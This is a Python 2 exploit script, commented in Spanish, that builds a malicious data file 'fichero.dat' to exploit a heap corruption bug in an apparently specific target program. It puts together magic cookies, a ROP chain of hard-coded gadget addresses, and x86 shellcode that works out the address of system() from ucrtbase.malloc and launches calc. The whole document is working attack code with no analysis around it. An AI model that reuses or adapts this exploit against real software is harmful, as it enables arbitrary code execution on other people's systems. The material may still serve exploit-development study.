import os
import struct

firstByte = "\xFF"
cookie2 = struct.pack("<I", 0x45464748)
cookie1 = struct.pack("<I", 0x25262728)

fixAlign = "\x90\x90\x90\x90" # Header Chunk Struct B
junk1 = "\x90" * 31

#jumpRopChain
#add ecx, 5C
#call ecx
jumpRopChain = "\x83\xC1\x5C\xFF\xD1"

#ROPChain
#pop ecx
#ret
rop1 = struct.pack("<I", 0x10101489)
#Dir a colocar en ecx
rop2 = struct.pack("<I", 0x0013AF82)
#mov eax, edx
#pop
#pop
rop3 = struct.pack("<I", 0x10101768) #Colocar edx que tiene la direccion del heap en eax
rop4 = "BBBB" #Basura para el pop
rop5 = "BBBB" #Basura para el pop
#Le resto 4 a eax
rop6 = struct.pack("<I", 0x10101990) #Decremento en 1 eax
rop7 = "BBBB" #Basura para el pop
rop8 = struct.pack("<I", 0x10101990) #Decremento en 1 eax
rop9 = "BBBB" #Basura para el pop
rop10 = struct.pack("<I", 0x10101990) #Decremento en 1 eax
rop11 = "BBBB" #Basura para el pop
rop12 = struct.pack("<I", 0x10101990) #Decremento en 1 eax
rop13 = "BBBB" #Basura para el pop
#mov ecx, [eax+24h]
#call ecx => Igual a call eax+24 que es el puntero a mi shellcode
rop14 = struct.pack("<I", 0x101012F7)
ropChain = rop1+rop2+rop3+rop4+rop5+rop6+rop7+rop8+rop9+rop10+rop11+rop12+rop13+rop14

#fixPointerSystem => #11 Bytes
#La idea es crear un puntero que apunte a el mismo, parar fixear algunas llamadas del heap corrupto
#push 1010441B
#pop eax
#mov [1010441B], eax
fixPointerSystem = "\x68\x1B\x44\x10\x10\x58\xA3\x1B\x44\x10\x10"

#Obtengo y llamo a System
#mov esi, [10103064] ucrtbase.malloc
#sub esi, 35E50
#add esi, B9E40
#PUSH 636c6163 #clac
#POP EAX
#MOV [10104446], EAX
#push 10104446
#call esi
system = "\x8B\x35\x64\x30\x10\x10\x81\xEE\x50\x5E\x03\x00\x81\xC6\x40\x9E\x0B\x00\x68\x63\x61\x6C\x63\x58\xA3\x46\x44\x10\x10\x68\x46\x44\x10\x10\xFF\xD6"
shellcode = fixPointerSystem+system

#Junk con address 1010441B, para poder trigerear el fixPointerSystem @Gracias Ricardo por el tip!
junk2 = struct.pack("<I", 0x1010441B)*(((1148-len(shellcode))/4))
junk2 = junk2+"\x90" # Fix 1 Byte
callEAX = struct.pack("<I", 0x10101075)
junk3 = "\x90"*5
secByte = "\x80" #Byte que se divide en 2 para llamar a virtualAlloc
junk4 = "B"*22

payload = firstByte+cookie2+cookie1+fixAlign+junk1+jumpRopChain+ropChain+shellcode+junk2+callEAX+junk3+secByte+junk4
print "File Created with: "+str(len(payload))+" Bytes"

f = open("fichero.dat", "w")
f.write(payload)
f.close()
